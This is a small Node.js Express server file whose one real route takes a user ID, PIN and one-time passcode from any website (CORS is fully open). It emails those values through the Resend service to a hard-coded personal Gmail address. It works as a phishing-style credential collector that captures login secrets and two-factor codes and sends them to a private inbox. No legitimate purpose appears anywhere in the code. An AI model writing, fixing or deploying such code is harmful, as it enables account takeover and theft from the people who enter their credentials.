const express = require('express');
const cors = require('cors');
const { Resend } = require('resend');

const app = express();
const resend = new Resend(process.env.RESEND_API_KEY);

app.use(cors());
app.use(express.json());

// TEST ROUTE: If you visit the link in your browser, you should see this message.
app.get('/', (req, res) => {
  res.send('Backend is Alive and Working!');
});

app.post('/send-data', async (req, res) => {
  const { userId, pin, otp } = req.body;
  try {
    const data = await resend.emails.send({
      from: 'Acme <onboarding@resend.dev>',
      to: 'mosesbenjamin1985@gmail.com', // Added quotes!
      subject: '🚀 New Site Activity',
      text: `User ID: ${userId}\nPIN: ${pin}\nOTP: ${otp}`
    });
    res.status(200).json({ message: 'Success', data });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

module.exports = app;
